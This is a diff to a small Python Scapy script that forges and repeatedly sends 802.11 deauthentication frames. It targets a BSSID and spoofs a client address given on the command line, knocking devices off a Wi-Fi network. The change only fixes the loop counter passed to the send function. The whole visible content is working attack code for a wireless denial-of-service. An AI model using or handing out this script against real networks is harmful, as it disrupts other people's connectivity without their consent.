@@ -28,11 +28,11 @@ from scapy.all import *
 __IN = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
 
 def main():
-  def deauth():
+  def deauth(n):
     sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=__IN[2],addr2=__IN[1],addr3=__IN[2])/Dot11Deauth(reason=7))
     print("[*] " + str(n+1) + ' Deauth sent via: ' + __IN[0] + ' to BSSID: ' + __IN[1] + ' spoofing Client: ' + __IN[2])
   for n in range(int(__IN[3])):
-    deauth()
+    deauth(n)
 
 if __name__ == "__main__":
   main()
